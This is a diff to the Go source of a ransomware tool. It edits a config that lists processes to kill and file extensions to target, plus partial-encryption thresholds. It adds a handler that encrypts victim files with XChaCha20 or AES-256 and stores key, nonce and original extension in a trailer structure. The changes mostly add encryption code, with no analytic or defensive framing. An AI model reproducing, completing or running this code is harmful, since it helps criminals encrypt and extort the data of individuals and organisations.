@@ -1,11 +1,13 @@
 package main
 
 import (
+	"crypto/cipher"
 	"crypto/elliptic"
 	"crypto/rsa"
 	"encoding/binary"
 	"fmt"
 	"github.com/Anonghost720/ecc"
+	"golang.org/x/crypto/chacha20"
 )
 
 type Config struct {
@@ -15,8 +17,8 @@ type Config struct {
 	FileNameExclusions      []string      `yaml:"file_name_skips"`
 	ProcessKillNames        []string      `yaml:"process_kill_names"`
 	FileExtensionInclusions []string      `yaml:"file_extension_targets"`
-	MaxSizeFullEncryption   int64         `yaml:"full_encryption_max_bytes"`
-	EncryptionPercent       int           `yaml:"encryption_percentage"`
+	EncryptionPercent       int
+	ThresholdFullEncrypt    int64
 }
 
 type RansomActor struct {
@@ -144,7 +146,6 @@ func (e ExtraDataStore) ToBytes() []byte {
 }
 
 func (e *ExtraDataStore) FromBytes(bytes []byte) error {
-	// TODO error checks on length
 	e.LengthSymmetricKey = int64(binary.LittleEndian.Uint64(bytes[0:8]))
 	e.SymmetricKey = bytes[8 : e.LengthSymmetricKey+8]
 	e.LengthSymmetricNonce = int64(binary.LittleEndian.Uint64(bytes[e.LengthSymmetricKey+8 : e.LengthSymmetricKey+8+8]))
@@ -153,4 +154,30 @@ func (e *ExtraDataStore) FromBytes(bytes []byte) error {
 	e.OriginalExtensionLength = int32(binary.LittleEndian.Uint32(bytes[e.LengthSymmetricKey+8+8+e.LengthSymmetricNonce+4 : e.LengthSymmetricKey+8+8+e.LengthSymmetricNonce+4+4]))
 	e.OriginalExtension = string(bytes[e.LengthSymmetricKey+8+8+e.LengthSymmetricNonce+4+4 : e.LengthSymmetricKey+8+8+e.LengthSymmetricNonce+4+4+int64(e.OriginalExtensionLength)])
 	return nil
+}
+
+type SymHandler struct {
+	System          string
+	XChaCha20Cipher *chacha20.Cipher
+	EDS             ExtraDataStore
+	AESCipher       cipher.Stream
+}
+
+func (s *SymHandler) Initialize(key []byte, nonce []byte) error {
+	if s.System == "xchacha20" {
+		s.XChaCha20Cipher, s.EDS = getXChaCha20Cipher(key, nonce)
+	} else if s.System == "aes256" {
+		s.AESCipher, s.EDS = getAES256Cipher(key, nonce)
+	} else {
+		return fmt.Errorf("Symmetric System not implemented: %s", s.System)
+	}
+	return nil
+}
+
+func (s *SymHandler) Encrypt(ct []byte, pt []byte) {
+	if s.System == "xchacha20" {
+		s.XChaCha20Cipher.XORKeyStream(ct, pt)
+	} else if s.System == "aes256" {
+		s.AESCipher.XORKeyStream(ct, pt)
+	}
 }
